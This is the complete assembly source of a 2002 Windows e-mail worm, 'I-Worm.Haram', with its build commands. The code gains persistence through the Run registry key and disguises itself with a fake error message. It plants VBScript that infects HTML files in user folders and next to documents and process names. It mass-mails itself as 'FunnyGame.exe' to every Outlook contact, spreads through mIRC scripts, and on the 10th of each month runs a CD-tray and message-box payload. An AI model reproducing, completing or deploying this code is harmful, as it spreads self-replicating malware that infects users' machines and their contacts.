comment *
Name : I-Worm.Haram
Author : PetiK

Language : win32asm
Date : May 13th 2002 - June 1st 2002

Size : 5192 bytes (compressed with Petite Tool)

Comments :	- Copy to %sysdir%\FunnyGame.exe
		- Search all doc files in "Personal" folder and create a new virus html file:

				example : document.doc -> document.htm
						1)		2)

			1) Good DOC file
			2) Good HTM virus (1571 bytes)

		- Put the name of all active process and add .htm:

				example : process.exe -> process.exe.htm
						3)		4)

			3) Real name of active process
			4) Real name of the HTM virus (in "C:\backup" folder for Win ME/2k/XP)

		- Create a random name file in StarUp folder to spread with Outlook

		- On the 10th, payload : open and close CD door and display a messagebox in loop

*

.586p
.model flat
.code

JUMPS

include win32api.inc

LF      equ     10
CR      equ     13
CRLF    equ     <13,10>

@pushsz         macro   msg2psh, empty
                local   next_instr
                ifnb    <empty>
                %out    too much arguments in macro '@pushsz'
                .err
                endif
                call    next_instr
                db      msg2psh,0
    next_instr:
endm

@endsz  	macro
	        local   nxtchr
	nxtchr: lodsb
	        test    al,al
	        jnz     nxtchr
endm

api	macro a
	extrn a:proc
	call a
endm

WIN32_FIND_DATA		struct
dwFileAttributes	dd 0
ftCreationTime		dd ?,?
ftLastAccessTime	dd ?,?
ftLastWriteTime		dd ?,?
nFileSizeHigh		dd 0
nFileSizeLow		dd 0
dwReserved0		dd 0,0
cFileName		db 260 dup(0)
cAlternateFileName	db 14  dup(0)
			db  2  dup (0)
WIN32_FIND_DATA		ends

PROCESSENTRY32 STRUCT
       dwSize              DWORD ?
       cntUsage            DWORD ?
       th32ProcessID       DWORD ?
       th32DefaultHeapID   DWORD ?
       th32ModuleID        DWORD ?
       cntThreads          DWORD ?
       th32ParentProcessID DWORD ?
       pcPriClassBase      DWORD ?
       dwFlags             DWORD ?
       szExeFile           db 260 dup(?)
PROCESSENTRY32 ENDS

start:	pushad
	@SEH_SetupFrame		<jmp end_worm>

hide_the_worm:
	call hide_worm

get_name:
	push	50
	mov	esi,offset orgwrm
	push	esi
	push	0
	api	GetModuleFileNameA

get_copy_name:
	mov	edi,offset cpywrm
	push	edi
	push	50
	push	edi
	api	GetSystemDirectoryA
	add	edi,eax
	mov	eax,'nuF\'
	stosd
	mov	eax,'aGyn'
	stosd
	mov	eax,'e.em'
	stosd
	mov	eax,'ex'
	stosd
	pop	edi

copy_worm:
	push	1
	push	edi
	push	esi
	api	CopyFileA
	test	eax,eax
	je	ok_copy

	push	50
	push	edi
	push	1
	@pushsz "Haram"
	@pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
	push	80000002h
	api	SHSetValueA

	push	50
	push	offset msgwrm
	push	esi
	api	GetFileTitleA
	push	10h
	push	offset msgwrm
	@pushsz "ERROR : this file is not a valid Win32 file."
	push	0
	api	MessageBoxA
ok_copy:

call	inf_doc_personal

get_startup_path:
	push	0
	push	7
	push	offset startup
	push	0
	api	SHGetSpecialFolderPathA
	push	offset startup
	api	SetCurrentDirectoryA

call	cr_vbsname

	mov	edi,offset vbsname

	push	0
	push	1
	push	2
	push	0
	push	1
	push	40000000h
	push	edi
	api	CreateFileA
	mov	ebp,eax
	push	0
	push	offset byte_write
	push	e_vbs - s_vbs
	push	offset s_vbs
	push	ebp
	api	WriteFile
	push	ebp
	api	CloseHandle


payload:
	mov	eax,offset sysTime
	push	eax
	api	GetSystemTime
	lea	eax,sysTime
	cmp	word ptr [eax+6],10
	jne	end_payload

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	@pushsz "set CDAudio door open"
	api	mciSendStringA

	push	500
	api	Sleep

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	@pushsz "set CDAudio door closed"
	api	mciSendStringA

	push	40h
	@pushsz "I-Worm.Haram"
	@pushsz "Coded by PetiK - ©2002 - France"
	push	0
	api	MessageBoxA

	api	GetTickCount
	push	10000
	pop	ecx
	xor	edx,edx
	div	ecx
	inc	edx
	mov	ecx,edx
	push	ecx
	api	Sleep
	jmp	payload

end_payload:

call	inf_process

end_worm:
	@SEH_RemoveFrame
	popad
	push	0
	api	ExitProcess

hide_worm	Proc
	pushad
	@pushsz	"KERNEL32.DLL"
	api	GetModuleHandleA
	xchg	eax,ecx
	jecxz	end_hide_worm
	@pushsz	"RegisterServiceProcess"		; Registered as Service Process
	push	ecx
	api	GetProcAddress
	xchg	eax,ecx
	jecxz	end_hide_worm
	push	1
	push	0
	call	ecx
	end_hide_worm:
	popad
	ret
hide_worm	EndP

Spread_Mirc	Proc
	push	offset cpywrm
	push	offset mirc_exe
	api	lstrcpy
	call	@mirc
	db 	"C:\mirc\script.ini",0
	db 	"C:\mirc32\script.ini",0		; spread with mIRC. Thanx to Microsoft.
	db 	"C:\progra~1\mirc\script.ini",0
	db 	"C:\progra~1\mirc32\script.ini",0
	@mirc:
	pop	esi
	push	4
	pop	ecx
	mirc_loop:
	push	ecx
	push	0
	push	80h
	push	2
	push	0
	push	1
	push	40000000h
	push	esi
	api	CreateFileA
	mov	ebp,eax
	push	0
	push	offset byte_write
	@tmp_mirc:
	push	e_mirc - s_mirc
	push	offset s_mirc
	push	ebp
	api	WriteFile
	push	ebp
	api	CloseHandle
	@endsz
	pop	ecx
	loop	mirc_loop
	end_spread_mirc:
	ret
Spread_Mirc	EndP



inf_doc_personal 	Proc
	pushad
get_personal_folder:
	push	0
	push	5
	push	offset personal
	push	0
	api	SHGetSpecialFolderPathA
	push	offset personal
	api	SetCurrentDirectoryA
fff_doc:
	push	offset ffile
	@pushsz "*.doc"
	api	FindFirstFileA
	inc	eax
	je	end_f_doc
	dec	eax
	mov	[hfind],eax

cr_file:
	push	offset ffile.cFileName
	push	offset new_file
	api	lstrcpy
	mov	esi,offset new_file
	push	esi
	api	lstrlen
	add	esi,eax
	sub	esi,4						; to become \SYSTEM\Wsock32
	mov	[esi],"mth."
	lodsd

	push	0
	push	1
	push	2
	push	0
	push	1
	push	40000000h
	push	offset new_file
	api	CreateFileA
	mov	ebp,eax
	push	0
	push	offset byte_write
	push	e_htm - s_htm
	push	offset s_htm
	push	ebp
	api	WriteFile
	push	ebp
	api	CloseHandle

fnf_doc:
	push	offset ffile
	push	[hfind]
	api	FindNextFileA
	test	eax,eax
	jne	cr_file
	push	[hfind]
	api	FindClose
end_f_doc:
	popad
	ret
inf_doc_personal	EndP


inf_process	Proc
	popad
create_folder:
	push	0
	@pushsz "C:\backup"
	api	CreateDirectoryA
	@pushsz "C:\backup"
	api	SetCurrentDirectoryA
enum_process:	
	push	0
	push	2
	api	CreateToolhelp32Snapshot
	mov	lSnapshot,eax
	inc	eax
	je	end_inf_process
	lea	eax,uProcess
	mov	[eax.dwSize], SIZE PROCESSENTRY32
	lea	eax,uProcess
	push	eax
	push	lSnapshot
	api	Process32First
check_process:
	test	eax,eax
	jz	end_process
	push	ecx
	mov	eax,ProcessID
	push	offset uProcess
	cmp	eax,[uProcess.th32ProcessID]
	je	NextProcess
	lea	ebx,[uProcess.szExeFile]

	push	ebx
	push	offset new_name
	api	lstrcpy
	mov	edi,offset new_name
	push	edi
	api	lstrlen
	add   edi,eax
	mov   eax,"mth."
	stosd
	xor   eax,eax
	stosd
	push	offset new_name
	@pushsz "System.htm"
	api	lstrcmp
	test	eax,eax
	jz	NextProcess

	push	0
	push	1
	push	2
	push	0
	push	1
	push	40000000h
	push	offset new_name
	api	CreateFileA
	mov	ebp,eax
	push	0
	push	offset byte_write
	push	e_htm - s_htm
	push	offset s_htm
	push	ebp
	api	WriteFile
	push	ebp
	api	CloseHandle

NextProcess:
	push	offset uProcess
	push	lSnapshot
	api	Process32Next
	jmp	check_process
end_process:
	push	lSnapshot
	api	CloseHandle
end_inf_process:
	pushad
	ret
inf_process	EndP


cr_vbsname	Proc
	mov	edi,offset vbsname
;	api	GetTickCount
	push	10
	pop	ecx
;	xor	edx,edx
;	div	ecx
;	inc	edx
;	mov	ecx,edx
	name_g:
	push	ecx
	api	GetTickCount
	push	'9'-'0'
	pop	ecx
	xor	edx,edx
	div	ecx
	xchg	eax,edx
	add	al,'0'
	stosb
	api	GetTickCount
	push	100
	pop	ecx
	xor	edx,edx
	div	ecx
	push	edx
	api	Sleep
	pop	ecx
	loop	name_g
	mov	eax,"sbv."
	stosd
	ret
cr_vbsname	EndP



.data
ffile	WIN32_FIND_DATA	<?>
sysTime	db 16 dup(0)

uProcess	PROCESSENTRY32 <?>
ProcessID	dd ?
lSnapshot	dd ?
new_name	db 100 dup (?)

orgwrm		db 50 dup (0)
cpywrm		db 50 dup (0)
msgwrm		db 50 dup (0)
startup		db 70 dup (0)
personal	db 70 dup (0)
new_file	db 90 dup (0)
vbsname		db 20 dup (0)
byte_write	dd ?
hfind		dd ?

s_mirc:	db "[script]",CRLF
	db ";Don't edit this file.",CRLF,CRLF
	db "n0=on 1:JOIN:{",CRLF
	db "n1= /if ( $nick == $me ) { halt }",CRLF
	db "n2= /.dcc send $nick "
mirc_exe	db 50 dup (?)
	db CRLF,"n3=}",0
e_mirc:	


s_htm:	db '<haram>',CRLF
	db '<html><head><title>Windows Media Player</title></head><body>',CRLF
	db '<script language=VBScript>',CRLF
	db 'On Error Resume Next',CRLF
	db 'MsgBox "Please accept the ActiveX",vbinformation,"Internet Explorer"',CRLF
	db 'Set upfkupfk=CreateObject("Scripting.FileSystemObject")',CRLF
	db 'Set kupfkvqg=CreateObject("WScript.Shell")',CRLF
	db 'If err.number=429 Then',CRLF
	db 'kupfkvqg.Run javascript:location.reload()',CRLF
	db 'Else',CRLF,CRLF
	db 'glvqglvb(upfkupfk.GetSpecialFolder(0))',CRLF
	db 'glvqglvb(upfkupfk.GetSpecialFolder(1))',CRLF
	db 'glvqglvb(kupfkvqg.SpecialFolders("MyDocuments"))',CRLF
	db 'glvqglvb(kupfkvqg.SpecialFolders("Desktop"))',CRLF
	db 'glvqglvb(kupfkvqg.SpecialFolders("Favorites"))',CRLF
	db 'glvqglvb(kupfkvqg.SpecialFolders("Fonts"))',CRLF
	db 'End If',CRLF,CRLF
	db 'Function glvqglvb(dir)',CRLF
	db 'If upfkupfk.FolderExists(dir) Then',CRLF
	db '  Set bbbbbbbb=upfkupfk.GetFolder(dir)',CRLF
	db '  Set bbblvqgl=bbbbbbbb.Files',CRLF
	db '  For each lvqgvqgl in bbblvqgl',CRLF
	db '    lvqglvqr=lcase(upfkupfk.GetExtensionName(lvqgvqgl.Name))',CRLF
	db '    If lvqglvqr="htm" or lvqglvqr="html" Then',CRLF
	db '      Set rhmwrrhm=upfkupfk.OpenTextFile(lvqgvqgl.path,1 ,False)',CRLF
	db '      if rhmwrrhm.ReadLine <> "<haram>" Then',CRLF
	db '        rhmwrrhm.Close()',CRLF
	db '        Set rhmwrrhm=upfkupfk.OpenTextFile(lvqgvqgl.path,1 ,False)',CRLF
	db '        htmorg=rhmwrrhm.ReadAll()',CRLF
	db '        rhmwrrhm.Close()',CRLF
	db '        Set mwrrhmwr=document.body.createTextRange',CRLF
	db '        Set rhmwrrhm=upfkupfk.CreateTextFile(lvqgvqgl.path, True, False)',CRLF
	db '        rhmwrrhm.WriteLine "<haram>"',CRLF
	db '        rhmwrrhm.Write(htmorg)',CRLF
	db '        rhmwrrhm.WriteLine mwrrhmwr.htmltext',CRLF
	db '        rhmwrrhm.Close()',CRLF
	db '      Else',CRLF
	db '        rhmwrrhm.Close()',CRLF
	db '      End If',CRLF
	db '    End If',CRLF
	db '  Next',CRLF
	db 'End If',CRLF
	db 'End Function',CRLF
	db '</script></body></html>',0
e_htm:

s_vbs:	db 'On Error Resume Next',CRLF
	db 'Set terqne = CreateObject("Scripting.FileSystemObject")',CRLF
	db 'Set qumhzh = CreateObject("WScript.Shell")',CRLF
	db 'Set sys = terqne.GetSpecialFolder(1)',CRLF
	db 'copyname = sys&"\FunnyGame.exe"',CRLF
	db 'Set htgx = CreateObject("Outlook.Application")',CRLF
	db 'Set ofcc = htgx.GetNameSpace("MAPI")',CRLF
	db 'For each c In ofcc.AddressLists',CRLF
	db 'If c.AddressEntries.Count <> 0 Then',CRLF
	db 'For d = 1 To c.AddressEntries.Count',CRLF
	db 'Set etldb = htgx.CreateItem(0)',CRLF
	db 'etldb.To = c.AddressEntries(d).Address',CRLF
	db 'etldb.Subject = "New game from the net for you " & c.AddressEntries(d).Name',CRLF
	db 'etldb.Body = "Play at this funny game. It''s very cool !"',CRLF
	db 'etldb.Attachments.Add(copyname)',CRLF
	db 'etldb.DeleteAfterSubmit = True',CRLF
	db 'If etldb.To <> "" Then',CRLF
	db 'etldb.Send',CRLF
	db 'End If',CRLF
	db 'Next',CRLF
	db 'End If',CRLF
	db 'Next',0
e_vbs:

ends
end	start

*************************************************************************

@tasm32 /M /ML haram.asm
@tlink32 -Tpe -aa -c -x haram.obj,,,import32,haram.def
rem pause
rem upx -9 haram.exe
@del *.obj
rem pause

*************************************************************************

IMPORTS

SHLWAPI.SHSetValueA
SHELL32.SHGetSpecialFolderPathA